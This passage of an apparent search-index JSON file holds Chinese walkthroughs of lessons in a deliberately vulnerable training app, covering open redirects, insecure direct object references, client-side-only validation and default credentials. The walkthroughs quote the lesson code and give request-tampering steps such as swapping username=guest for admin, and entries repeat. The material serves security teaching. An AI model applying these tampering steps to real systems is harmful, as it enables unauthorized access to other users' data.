Forwards(\u672a\u9a8c\u8bc1\u7684\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1)"},{"location":"vul/Unvalidated-Redirects-and-Forwards.html#_1","text":"\u9700\u8981\u6784\u9020\u4e00\u4e2aurl\u91cd\u5b9a\u5411/\u8f6c\u53d1\u7684\u529f\u80fd,\u901a\u8fc7\u63d0\u4ea4\u4e00\u4e2aURL,\u8fdb\u800c\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2aURL\u5730\u5740","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Unvalidated-Redirects-and-Forwards.html#_2","text":"\u70b9\u51fb \u53d1\u9001\u4fe1\u606f \u6309\u94ae\uff0c\u6293\u53d6\u5230\u6570\u636e\u5305 POST /lessons/f15f2766c971e16e68aa26043e6016a0a7f6879283c873d9476a8e7e94ea736f HTTP/1.1 messageForAdmin=dd&csrfToken=57966045510818911837005793670200998761 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5728\u6587\u4ef6: src/main/java/servlets/module/lesson/UnvalidatedForwardsLesson.java \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b: String messageForAdmin = request.getParameter(\"messageForAdmin\").toLowerCase(); log.debug(\"User Submitted - \" + messageForAdmin); String htmlOutput = new String(); boolean validUrl = true; boolean validSolution = false; boolean validAttack = false; try { URL csrfUrl = new URL(messageForAdmin); log.debug(\"Url Host: \" + csrfUrl.getHost()); log.debug(\"Url Port: \" + csrfUrl.getPort()); log.debug(\"Url Path: \" + csrfUrl.getPath()); log.debug(\"Url Query: \" + csrfUrl.getQuery()); validSolution = csrfUrl.getPath().toLowerCase().equalsIgnoreCase(\"/user/redirect\"); if(!validSolution) log.debug(\"Invalid Solution: Bad Path or Above\"); validSolution = csrfUrl.getQuery().toLowerCase().startsWith((\"to=\").toLowerCase()) && validSolution; if(!validSolution) log.debug(\"Invalid Solution: Bad Query or Above\"); if(validSolution) { log.debug(\"Redirect URL Correct: Now checking the Redirected URL for valid CSRF Attack\"); int csrfStart = 0; int csrfEnd = 0; csrfStart = csrfUrl.getQuery().indexOf(\"to=\") + 3; csrfEnd = csrfUrl.getQuery().indexOf(\"&\"); if(csrfEnd == -1) { csrfEnd = csrfUrl.getQuery().length(); } String csrfAttack = csrfUrl.getQuery().substring(csrfStart, csrfEnd); log.debug(\"csrfAttack Found to be: \" + csrfAttack); validAttack = FindXSS.findCsrfAttackUrl(csrfAttack, \"/root/grantComplete/unvalidatedredirectlesson\", \"userId\", tempId); messageForAdmin\u53c2\u6570\u83b7\u5f97\u5230\u4e00\u4e2a\u5b8c\u6574url\u5730\u5740\uff0c\u7ecf\u8fc7URL\u7c7b\u8fdb\u884c\u89e3\u6790\uff0c\u5224\u65ad\u8def\u5f84\u662f\u5426\u662f /usr/redirect ,\u63d0\u53d6\u63d0\u4ea4\u8def\u5f84\u7684to\u53c2\u6570\u503c\uff0c\u901a\u8fc7FindXSS.findCsrfAttackUrl \u8fdb\u4e00\u6b65\u8fdb\u884c\u5224\u65ad\u8def\u5f84\u548cuserId\u7b49\u53c2\u6570","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Unvalidated-Redirects-and-Forwards.html#_3","text":"\u672c\u9898\u6bd4\u8f83\u7b80\u5355\uff0c\u6784\u9020\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u5408\u6cd5url\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Unvalidated-Redirects-and-Forwards.html#_4","text":"\u5bf9\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684URL\u5730\u5740\u8981\u8fdb\u884c\u4e25\u683c\u6821\u9a8c\uff0c\u5426\u5219\u5f88\u5bb9\u6613\u51fa\u73b0\u8df3\u8f6c\u5230\u4efb\u610f\u7b2c\u4e09\u65b9\u5730\u5740","title":"\u603b\u7ed3"},{"location":"vul/insecure-derect-object-references.html","text":"Insecure Direct Object References(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u672c\u9898\u663e\u793a\u4e86\u4e00\u4e2a\u6e38\u5ba2\u7528\u6237\u7684\u4e2a\u4eba\u8d44\u6599(\u5e74\u9f84\u3001\u4f4f\u5740\u3001\u90ae\u7bb1\u7b49), \u8981\u6c42\u6211\u4eec\u83b7\u5f97\u7ba1\u7406\u5458\u4e2a\u4eba\u8d44\u6599\u7684\u4e2d\u4fdd\u5b58\u7684\u901a\u5173\u5bc6\u94a5\u4fe1\u606f \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb \u5237\u65b0\u4e2a\u4eba\u8d44\u6599 \u6309\u94ae \u901a\u8fc7\u4ee3\u7406 \u6293\u5230\u8bf7\u6c42\u6570\u636e\u5305: POST /lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100 username=guest \u540e\u7aef\u54cd\u5e94\u4ee3\u7801\u5728\u6587\u4ef6 src/main/java/servlets/module/lesson/DirectObjectLesson.java \u5177\u4f53\u5b9e\u73b0\u6bd4\u8f83\u7b80\u5355\uff0c\u8bfb\u53d6username\u503c\uff0c\u5982\u679c\u662fguest\u5219\u8fd4\u56deguest\u76f8\u5173\u4fe1\u606f\uff0c\u5982\u679c\u662fadmin\u5219\u8fd4\u56de\u901a\u8fc7\u5bc6\u94a5 String userName = request.getParameter(\"username\"); if(userName.equalsIgnoreCase(\"guest\")) { log.debug(\"Guest Profile Found\"); htmlOutput = htmlGuest(bundle); } else if(userName.equalsIgnoreCase(\"admin\")) { // Get key and add it to the output String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute(\"userName\")); log.debug(\"Admin Profile Found\"); htmlOutput = htmlAdmin(bundle, userKey); } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4f7f\u7528\u4ee3\u7406\u5de5\u5177,\u62e6\u622a\u8bf7\u6c42 \u4fee\u6539username=guest\u4e3ausername=admin \u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42 \u670d\u52a1\u5668\u8fd4\u56de\u901a\u8fc7\u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u5b8c\u5168\u4f9d\u8d56\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c \uff0c\u5728\u65e5\u5e38\u7684\u7cfb\u7edf\u4e2d\u6bd4\u8f83\u591a \u5b89\u5168\u5f00\u53d1:\u9700\u8981\u5c06\u6838\u5fc3\u529f\u80fd,\u5982\u6743\u9650\u7ba1\u7406\u76f8\u5173\u529f\u80fd\u7684\u8bb0\u5f55\u4fe1\u606f,\u4fdd\u5b58\u5230session\u4e2d \u6b63\u5e38\u6d41\u7a0b \u7528\u6237\u767b\u5f55\u540e\uff0c\u5c06\u7528\u6237\u552f\u4e00\u6807\u8bc6\u5982userid\u6216username\u4fdd\u5b58\u5230session\u4e2d \u5f53\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u65f6\uff0c\u76f4\u63a5\u4ecesession\u4e2d\u8bfb\u53d6","title":"Insecure Direct Object References(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528)"},{"location":"vul/insecure-derect-object-references.html#insecure-direct-object-references","text":"","title":"Insecure Direct Object References(\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528)"},{"location":"vul/insecure-derect-object-references.html#_1","text":"\u672c\u9898\u663e\u793a\u4e86\u4e00\u4e2a\u6e38\u5ba2\u7528\u6237\u7684\u4e2a\u4eba\u8d44\u6599(\u5e74\u9f84\u3001\u4f4f\u5740\u3001\u90ae\u7bb1\u7b49), \u8981\u6c42\u6211\u4eec\u83b7\u5f97\u7ba1\u7406\u5458\u4e2a\u4eba\u8d44\u6599\u7684\u4e2d\u4fdd\u5b58\u7684\u901a\u5173\u5bc6\u94a5\u4fe1\u606f","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/insecure-derect-object-references.html#_2","text":"\u70b9\u51fb \u5237\u65b0\u4e2a\u4eba\u8d44\u6599 \u6309\u94ae \u901a\u8fc7\u4ee3\u7406 \u6293\u5230\u8bf7\u6c42\u6570\u636e\u5305: POST /lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100 username=guest \u540e\u7aef\u54cd\u5e94\u4ee3\u7801\u5728\u6587\u4ef6 src/main/java/servlets/module/lesson/DirectObjectLesson.java \u5177\u4f53\u5b9e\u73b0\u6bd4\u8f83\u7b80\u5355\uff0c\u8bfb\u53d6username\u503c\uff0c\u5982\u679c\u662fguest\u5219\u8fd4\u56deguest\u76f8\u5173\u4fe1\u606f\uff0c\u5982\u679c\u662fadmin\u5219\u8fd4\u56de\u901a\u8fc7\u5bc6\u94a5 String userName = request.getParameter(\"username\"); if(userName.equalsIgnoreCase(\"guest\")) { log.debug(\"Guest Profile Found\"); htmlOutput = htmlGuest(bundle); } else if(userName.equalsIgnoreCase(\"admin\")) { // Get key and add it to the output String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute(\"userName\")); log.debug(\"Admin Profile Found\"); htmlOutput = htmlAdmin(bundle, userKey); }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/insecure-derect-object-references.html#_3","text":"\u4f7f\u7528\u4ee3\u7406\u5de5\u5177,\u62e6\u622a\u8bf7\u6c42 \u4fee\u6539username=guest\u4e3ausername=admin \u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42 \u670d\u52a1\u5668\u8fd4\u56de\u901a\u8fc7\u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/insecure-derect-object-references.html#_4","text":"\u5b8c\u5168\u4f9d\u8d56\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c \uff0c\u5728\u65e5\u5e38\u7684\u7cfb\u7edf\u4e2d\u6bd4\u8f83\u591a \u5b89\u5168\u5f00\u53d1:\u9700\u8981\u5c06\u6838\u5fc3\u529f\u80fd,\u5982\u6743\u9650\u7ba1\u7406\u76f8\u5173\u529f\u80fd\u7684\u8bb0\u5f55\u4fe1\u606f,\u4fdd\u5b58\u5230session\u4e2d \u6b63\u5e38\u6d41\u7a0b \u7528\u6237\u767b\u5f55\u540e\uff0c\u5c06\u7528\u6237\u552f\u4e00\u6807\u8bc6\u5982userid\u6216username\u4fdd\u5b58\u5230session\u4e2d \u5f53\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u65f6\uff0c\u76f4\u63a5\u4ecesession\u4e2d\u8bfb\u53d6","title":"\u603b\u7ed3"},{"location":"vul/poor-data-validation.html","text":"Poor Data Validation(\u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u672c\u9898\u9700\u8981\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u4e00\u4e2a\u8d1f\u6570,\u5e76\u4e14\u63d0\u4ea4\u5230\u670d\u52a1\u7aef,\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u5728\u8f93\u5165\u6846\u4e2d\u8f93\u51651,\u70b9\u51fb \u63d0\u4ea4\u6570\u5b57 \u4f7f\u7528\u4ee3\u7406 \u6293\u5230\u8bf7\u6c42\u5305 POST /lessons/4d8d50a458ca5f1f7e2506dd5557ae1f7da21282795d0ed86c55fefe41eb874f userdata=1 \u6839\u636eweb.xml\u914d\u7f6e,\u77e5\u9053\u670d\u52a1\u7aef\u5bf9\u5e94\u7684\u4ee3\u7801servlets.module.lesson.PoorValidationLesson,\u5373src/main/java/servlets/module/lesson/PoorValidationLesson.java web.xml <servlet> <servlet-name>/lessons/4d8d50a458ca5f1f7e2506dd5557ae1f7da21282795d0ed86c55fefe41eb874f</servlet-name> <servlet-class>servlets.module.lesson.PoorValidationLesson</servlet-class> </servlet> \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801: String userData = request.getParameter(\"userdata\"); log.debug(\"User Submitted - \" + userData); String htmlOutput = new String(); int userNumber = Integer.parseInt(userData); if(userNumber < 0) { //\u901a\u5173 } \u5982\u679c\u4f20\u5165\u7684\u53d8\u91cfuserdata\u4e3a\u8d1f\u6570,\u5219\u53ef\u4ee5\u901a\u5173 \u4f46\u76f4\u63a5\u5728\u9875\u9762\u8f93\u5165\u6846\u8f93\u5165-1,\u70b9\u51fb\u63d0\u4ea4\u6309\u94ae \u53d1\u73b0\u8fd4\u56de \"\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef:\u65e0\u6548\u6570\u5b57: \u6570\u5b57\u5fc5\u987b\u5927\u4e8e 0\",\u53d1\u73b0\u662f\u5728\u524d\u7aefjavascript\u8fdb\u884c\u4e86\u6821\u9a8c src/main/webapp/lessons/4d8d50a458ca5f1f7e2506dd5557ae1f7da21282795d0ed86c55fefe41eb874f.jsp line:127~139 \u8fdb\u884c\u4e86\u5ba2\u6237\u7aef\u6821\u9a8c\uff0c\u5982\u679c\u63d0\u4ea4\u6570\u636e\u5c0f\u4e8e0,\u5219\u62d2\u7edd\u63d0\u4ea4 counter = counter + 1; console.log(\"Counter: \" + counter); var number = $(\"#numberBox\").val(); var theError = \"\"; if(number.length == 0) { console.log(\"No Number Submitted\"); theError = \"<%= bundle.getString(\"error.noNumber\") %>\"; } else if (number < 0) { console.log(\"Invalid Number Submitted\"); theError = \"<%= bundle.getString(\"error.badNumber\") %>\"; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4f7f\u7528\u4ee3\u7406\u5de5\u5177,\u62e6\u622a\u8bf7\u6c42 \u4fee\u6539userdata=1 \u4e3a userdata=-1 \u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42 \u670d\u52a1\u5668\u8fd4\u56de\u901a\u5173\u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u5bf9\u8bf7\u6c42\u53c2\u6570\u8fdb\u884c\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u4e00\u5b9a\u8981\u5728\u670d\u52a1\u7aef\u8fdb\u884c\u6821\u9a8c\uff0c\u5426\u5219\u901a\u8fc7\u4ee3\u7406\u6293\u5305\u662f\u53ef\u4ee5\u7be1\u6539\u524d\u7aef\u6821\u9a8c \u524d\u7aef\u6821\u9a8c\u7684\u6536\u76ca\uff0c\u4ec5\u4ec5\u662f\u5728\u5f02\u5e38\u8f93\u5165\u65f6\uff0c\u51cf\u5c11\u5ba2\u6237\u7aef\u8bf7\u6c42\uff0c\u5bf9\u5b89\u5168\u6027\u6ca1\u6709\u63d0\u9ad8","title":"Poor Data Validation(\u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1)"},{"location":"vul/poor-data-validation.html#poor-data-validation","text":"","title":"Poor Data Validation(\u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1)"},{"location":"vul/poor-data-validation.html#_1","text":"\u672c\u9898\u9700\u8981\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u4e00\u4e2a\u8d1f\u6570,\u5e76\u4e14\u63d0\u4ea4\u5230\u670d\u52a1\u7aef,\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/poor-data-validation.html#_2","text":"\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u51651,\u70b9\u51fb \u63d0\u4ea4\u6570\u5b57 \u4f7f\u7528\u4ee3\u7406 \u6293\u5230\u8bf7\u6c42\u5305 POST /lessons/4d8d50a458ca5f1f7e2506dd5557ae1f7da21282795d0ed86c55fefe41eb874f userdata=1 \u6839\u636eweb.xml\u914d\u7f6e,\u77e5\u9053\u670d\u52a1\u7aef\u5bf9\u5e94\u7684\u4ee3\u7801servlets.module.lesson.PoorValidationLesson,\u5373src/main/java/servlets/module/lesson/PoorValidationLesson.java web.xml <servlet> <servlet-name>/lessons/4d8d50a458ca5f1f7e2506dd5557ae1f7da21282795d0ed86c55fefe41eb874f</servlet-name> <servlet-class>servlets.module.lesson.PoorValidationLesson</servlet-class> </servlet> \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801: String userData = request.getParameter(\"userdata\"); log.debug(\"User Submitted - \" + userData); String htmlOutput = new String(); int userNumber = Integer.parseInt(userData); if(userNumber < 0) { //\u901a\u5173 } \u5982\u679c\u4f20\u5165\u7684\u53d8\u91cfuserdata\u4e3a\u8d1f\u6570,\u5219\u53ef\u4ee5\u901a\u5173 \u4f46\u76f4\u63a5\u5728\u9875\u9762\u8f93\u5165\u6846\u8f93\u5165-1,\u70b9\u51fb\u63d0\u4ea4\u6309\u94ae \u53d1\u73b0\u8fd4\u56de \"\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef:\u65e0\u6548\u6570\u5b57: \u6570\u5b57\u5fc5\u987b\u5927\u4e8e 0\",\u53d1\u73b0\u662f\u5728\u524d\u7aefjavascript\u8fdb\u884c\u4e86\u6821\u9a8c src/main/webapp/lessons/4d8d50a458ca5f1f7e2506dd5557ae1f7da21282795d0ed86c55fefe41eb874f.jsp line:127~139 \u8fdb\u884c\u4e86\u5ba2\u6237\u7aef\u6821\u9a8c\uff0c\u5982\u679c\u63d0\u4ea4\u6570\u636e\u5c0f\u4e8e0,\u5219\u62d2\u7edd\u63d0\u4ea4 counter = counter + 1; console.log(\"Counter: \" + counter); var number = $(\"#numberBox\").val(); var theError = \"\"; if(number.length == 0) { console.log(\"No Number Submitted\"); theError = \"<%= bundle.getString(\"error.noNumber\") %>\"; } else if (number < 0) { console.log(\"Invalid Number Submitted\"); theError = \"<%= bundle.getString(\"error.badNumber\") %>\"; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/poor-data-validation.html#_3","text":"\u4f7f\u7528\u4ee3\u7406\u5de5\u5177,\u62e6\u622a\u8bf7\u6c42 \u4fee\u6539userdata=1 \u4e3a userdata=-1 \u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42 \u670d\u52a1\u5668\u8fd4\u56de\u901a\u5173\u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/poor-data-validation.html#_4","text":"\u5bf9\u8bf7\u6c42\u53c2\u6570\u8fdb\u884c\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u4e00\u5b9a\u8981\u5728\u670d\u52a1\u7aef\u8fdb\u884c\u6821\u9a8c\uff0c\u5426\u5219\u901a\u8fc7\u4ee3\u7406\u6293\u5305\u662f\u53ef\u4ee5\u7be1\u6539\u524d\u7aef\u6821\u9a8c \u524d\u7aef\u6821\u9a8c\u7684\u6536\u76ca\uff0c\u4ec5\u4ec5\u662f\u5728\u5f02\u5e38\u8f93\u5165\u65f6\uff0c\u51cf\u5c11\u5ba2\u6237\u7aef\u8bf7\u6c42\uff0c\u5bf9\u5b89\u5168\u6027\u6ca1\u6709\u63d0\u9ad8","title":"\u603b\u7ed3"},{"location":"vul/security-misconfiguration.html","text":"Security Misconfiguration(\u5b89\u5168\u914d\u7f6e\u9519\u8bef) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u8f93\u5165\u672c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u53e3\u4ee4\uff0c\u5373\u53ef\u83b7\u5f97\u901a\u5173\u5bc6\u94a5\uff0c\u4e3b\u8981\u5c55\u793a\u5982\u679c\u9ed8\u8ba4\u914d\u7f6e\u4e0d\u8fdb\u884c\u4fee\u6539\uff0c\u5371\u5bb3\u5de8\u5927 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u5728\u754c\u9762\u4e0a\u8f93\u5165\u8d26\u53f7\u548c\u5bc6\u7801,\u70b9\u51fb\u63d0\u4ea4 POST /lessons/fe04648f43cdf2d523ecf1675f1ade2cde04a7a2e9a7f1a80dbb6dc9f717c833 userName=admin&userPass=password \u540e\u7aef\u5b9e\u73b0\u4ee3\u7801\u5728 /src/main/java/servlets/module/lesson/SecurityMisconfigLesson.java \u6587\u4ef6\u4e2d String userName = request.getParameter(\"userName\"); log.debug(\"User Name - \" + userName); String userPass = request.getParameter(\"userPass\"); log.debug(\"User Pass - \" + userName); boolean loggedIn = userName.contentEquals(\"admin\") && userPass.contentEquals(\"password\"); \u5224\u65ad\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u662f admin/password \u89e3\u9898\u6b65\u9aa4 \u00b6 \u76f4\u63a5\u5728\u9875\u9762\u8f93\u5165\u6846\u4e2d\u8f93\u5165admin \u5bc6\u7801\u8f93\u5165\u6846\u4e2d\u8f93\u5165password \u70b9\u51fb\u63d0\u4ea4\u5373\u53ef \u603b\u7ed3 \u00b6 \u5728\u5f00\u59cb\u4f7f\u7528\u4efb\u4f55\u7cfb\u7edf\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u3001\u6570\u636e\u5e93\u3001\u5e94\u7528\u670d\u52a1\u3001\u7b2c\u4e09\u65b9\u5e93\u7b49\u5e94\u8be5\u8fdb\u884c\u9ed8\u8ba4\u64cd\u4f5c\u4fee\u6539\uff0c\u4ee5\u63d0\u9ad8\u5176\u5b89\u5168\u6027\uff0c\u6700\u57fa\u7840\u7684\u662f\u4fee\u6539\u5176\u9ed8\u8ba4\u7684\u8d26\u53f7\u548c\u5bc6\u7801 \u7c7b\u4f3c\u95ee\u9898\u5728\u6784\u5efa\u7cfb\u7edf\u65f6\uff0c\u975e\u5e38\u5bb9\u6613\u51fa\u95ee\u9898\uff0c\u539f\u56e0:\u4e00\u822c\u7cfb\u7edf\u90fd\u590d\u6742\u548c\u5e9e\u5927\uff0c\u5bf9\u4e8e\u4f7f\u7528\u8005\u60f3\u5b8c\u5168\u4e86\u89e3\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u5b89\u5168\u914d\u7f6e\u5176\u5b9e\u662f\u5f88\u96be\u7684\uff0c\u66f4\u591a\u7684\u7814\u53d1\u6216\u8fd0\u7ef4\u57fa\u672c\u90fd\u662f\u4e0b\u8f7d\u7cfb\u7edf\uff0c\u6309\u7167\u7f51\u7edc\u6559\u7a0b\u6216\u5b98\u65b9\u521d\u59cb\u5316\u5411\u5bfc\u8fdb\u884c\u90e8\u7f72\uff0c\u80fd\u7528\u5df2\u7ecf\u4e07\u5e78\uff0c\u57fa\u672c\u4e0d\u4f1a\u8fc7\u591a\u8003\u8651\u5b89\u5168\u6027(\u56e0\u4e3a\u8981\u9605\u8bfb\u5927\u91cf\u6587\u6863) \u5bf9\u4e8e\u8fd9\u7c7b\u95ee\u9898\u8981\u600e\u6837\u89e3\u51b3? \u5e0c\u671b\u6240\u6709\u7684\u5f00\u6e90/\u77e5\u540d/\u7b2c\u4e09\u65b9\u7cfb\u7edf\uff0c\u9ed8\u8ba4\u914d\u7f6e\u90fd\u662f\u6700\u5b89\u5168\u7684\uff0c\u5982:\u529f\u80fd\u90fd\u662f\u9ed8\u8ba4\u5173\u95ed\uff0c\u4f7f\u7528\u8005\u6309\u9700\u5f00\u653e\uff0c\u9ed8\u8ba4\u8d26\u53f7\u548c\u53e3\u4ee4\uff0c\u5f3a\u5236\u7b2c\u4e00\u6b21\u767b\u5f55\u8fdb\u884c\u4fee\u6539\uff0c\u9a8c\u8bc1\u5bc6\u7801\u590d\u6742\u5ea6\u7b49 \u4f7f\u7528\u8005\uff0c\u9700\u8981\u82b1\u65f6\u95f4\uff0c\u5bf9\u7cfb\u7edf\u8fdb\u884c\u6df1\u5165\u4e86\u89e3\u548c\u914d\u7f6e","title":"Security Misconfiguration(\u5b89\u5168\u914d\u7f6e\u9519\u8bef)"},{"location":"vul/security-misconfiguration.html#security-misconfiguration","text":"","title":"Security Misconfiguration(\u5b89\u5168\u914d\u7f6e\u9519\u8bef)"},{"location":"vul/security-misconfiguration.html#_1","text":"\u9700\u8981\u8f93\u5165\u672c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u53e3\u4ee4\uff0c\u5373\u53ef\u83b7\u5f97\u901a\u5173\u5bc6\u94a5\uff0c\u4e3b\u8981\u5c55\u793a\u5982\u679c\u9ed8\u8ba4\u914d\u7f6e\u4e0d\u8fdb\u884c\u4fee\u6539\uff0c\u5371\u5bb3\u5de8\u5927","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/security-misconfiguration.html#_2","text":"\u5728\u754c\u9762\u4e0a\u8f93\u5165\u8d26\u53f7\u548c\u5bc6\u7801,\u70b9\u51fb\u63d0\u4ea4 POST /lessons/fe04648f43cdf2d523ecf1675f1ade2cde04a7a2e9a7f1a80dbb6dc9f717c833 userName=admin&userPass=password \u540e\u7aef\u5b9e\u73b0\u4ee3\u7801\u5728 /src/main/java/servlets/module/lesson/SecurityMisconfigLesson.java \u6587\u4ef6\u4e2d String userName = request.getParameter(\"userName\"); log.debug(\"User Name - \" + userName); String userPass = request.getParameter(\"userPass\"); log.debug(\"User Pass - \" + userName); boolean loggedIn = userName.contentEquals(\"admin\") && userPass.contentEquals(\"password\"); \u5224\u65ad\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u662f admin/password","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/security-misconfiguration.html#_3","text":"\u76f4\u63a5\u5728\u9875\u9762\u8f93\u5165\u6846\u4e2d\u8f93\u5165admin \u5bc6\u7801\u8f93\u5165\u6846\u4e2d\u8f93\u5165password \u70b9\u51fb\u63d0\u4ea4\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/security-misconfiguration.html#_4","text":"\u5728\u5f00\u59cb\u4f7f\u7528\u4efb\u4f55\u7cfb\u7edf\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u3001\u6570\u636e\u5e93\u3001\u5e94\u7528\u670d\u52a1\u3001\u7b2c\u4e09\u65b9\u5e93\u7b49\u5e94\u8be5\u8fdb\u884c\u9ed8\u8ba4\u64cd\u4f5c\u4fee\u6539\uff0c\u4ee5\u63d0\u9ad8\u5176\u5b89\u5168\u6027\uff0c\u6700\u57fa\u7840\u7684\u662f\u4fee\u6539\u5176\u9ed8\u8ba4\u7684\u8d26\u53f7\u548c\u5bc6\u7801 \u7c7b\u4f3c\u95ee\u9898\u5728\u6784\u5efa\u7cfb\u7edf\u65f6\uff0c\u975e\u5e38\u5bb9\u6613\u51fa\u95ee\u9898\uff0c\u539f\u56e0:\u4e00\u822c\u7cfb\u7edf\u90fd\u590d\u6742\u548c\u5e9e\u5927\uff0c\u5bf9\u4e8e\u4f7f\u7528\u8005\u60f3\u5b8c\u5168\u4e86\u89e3\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u5b89\u5168\u914d\u7f6e\u5176\u5b9e\u662f\u5f88\u96be\u7684\uff0c\u66f4\u591a\u7684\u7814\u53d1\u6216\u8fd0\u7ef4\u57fa\u672c\u90fd\u662f\u4e0b\u8f7d\u7cfb\u7edf\uff0c\u6309\u7167\u7f51\u7edc\u6559\u7a0b\u6216\u5b98\u65b9\u521d\u59cb\u5316\u5411\u5bfc\u8fdb\u884c\u90e8\u7f72\uff0c\u80fd\u7528\u5df2\u7ecf\u4e07\u5e78\uff0c\u57fa\u672c\u4e0d\u4f1a\u8fc7\u591a\u8003\u8651\u5b89\u5168\u6027(\u56e0\u4e3a\u8981\u9605\u8bfb\u5927\u91cf\u6587\u6863) \u5bf9\u4e8e\u8fd9\u7c7b\u95ee\u9898\u8981\u600e\u6837\u89e3\u51b3? \u5e0c\u671b\u6240\u6709\u7684\u5f00\u6e90/\u77e5\u540d/\u7b2c\u4e09\u65b9\u7cfb\u7edf\uff0c\u9ed8\u8ba4\u914d\u7f6e\u90fd\u662f\u6700\u5b89\u5168\u7684\uff0c\u5982:\u529f\u80fd\u90fd\u662f\u9ed8\u8ba4\u5173\u95ed\uff0c\u4f7f\u7528\u8005\u6309\u9700\u5f00\u653e\uff0c\u9ed8\u8ba4\u8d26\u53f7\u548c\u53e3\u4ee4\uff0c\u5f3a\u5236\u7b2c\u4e00\u6b21\u767b\u5f55\u8fdb\u884c\u4fee\u6539\uff0c\u9a8c\u8bc1\u5bc6\u7801\u590d\u6742\u5ea6\u7b49 \u4f7f\u7528\u8005\uff0c\u9700\u8981\u82b1\u65f6\u95f4\uff0c\u5bf9\u7cfb\u7edf\u8fdb\u884c\u6df1\u5165\u4e86\u89e3\u548c\u914d\u7f6e","title":"\u603b\u7ed3"},{"location":"vul/app/Broken-Crypto.html","text":"Broken Crypto(\u5931\u6548\u7684\u52a0\u5bc6) \u00b6 \u9898\u4ecb\u7ecd \u00b6 